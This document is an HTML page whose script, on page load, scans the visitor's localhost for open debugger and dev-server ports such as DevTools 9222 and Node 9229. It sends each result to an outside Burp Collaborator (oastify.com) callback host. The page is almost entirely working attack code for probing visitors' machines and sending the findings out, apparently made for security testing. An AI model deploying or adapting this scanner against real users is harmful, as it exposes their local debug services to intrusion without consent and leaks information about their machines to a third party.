<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Local Debug-Port Scanner</title>
  <style>
    body { font-family: system-ui, sans-serif; margin: 2rem; }
    #status { margin-top: 1rem; font-weight: 600; }
  </style>
</head>
<body>
  <h1>Scanning localhost for debugger/dev ports…</h1>
  <div id="status">Working…</div>

  <script>
    /* ========== CONFIG ========== */
    const COLLAB_URL = 'https://457mfhvylme5j9ytk1x6ns9j1a72v3js.oastify.com';
    const PORTS = [
      9200, 9220, 9221, 9222, 9223, 9224, 9225, 9229, 9230, 9231,
      1234, 1337, 3000, 3001, 3002, 3333, 4444, 5555, 6006,
      7000, 7001, 7777, 8080, 9000, 9876
    ];
    const PATHS = ['', 'json'];    // root & common DevTools endpoint
    const TIMEOUT_MS = 4000;

    /* ========== HELPERS ========== */
    function pingCollaborator(slug) {
      fetch(`${COLLAB_URL}/${slug}`, { mode: 'no-cors', cache: 'no-store' })
        .catch(() => {}); // ignore network-layer errors
    }

    function probe(url) {
      return new Promise(resolve => {
        const controller = new AbortController();
        const timer = setTimeout(() => { controller.abort(); resolve(false); }, TIMEOUT_MS);

        fetch(url, { mode: 'no-cors', cache: 'no-store', signal: controller.signal })
          .then(() => { clearTimeout(timer); resolve(true); })   // request reached a listener
          .catch(() => { clearTimeout(timer); resolve(false); }); // refused / blocked
      });
    }

    /* ========== MAIN ========== */
    (async () => {
      for (const port of PORTS) {
        for (const path of PATHS) {
          const target = `http://127.0.0.1:${port}/${path}`;
          if (await probe(target)) {
            document.getElementById('status').textContent =
              `✅ Port ${port} answered at “/${path || ''}”`;
            pingCollaborator(`open-${port}-${path || 'root'}`);
            console.log(`[+] Open: ${target}`);
            return; // stop after first hit; remove if full scan desired
          }
        }
      }

      /* nothing responded */
      document.getElementById('status').textContent = '❌ No debugger ports responded.';
      pingCollaborator('no-port-found');
      console.log('[-] No open ports detected');
    })();
  </script>
</body>
</html>
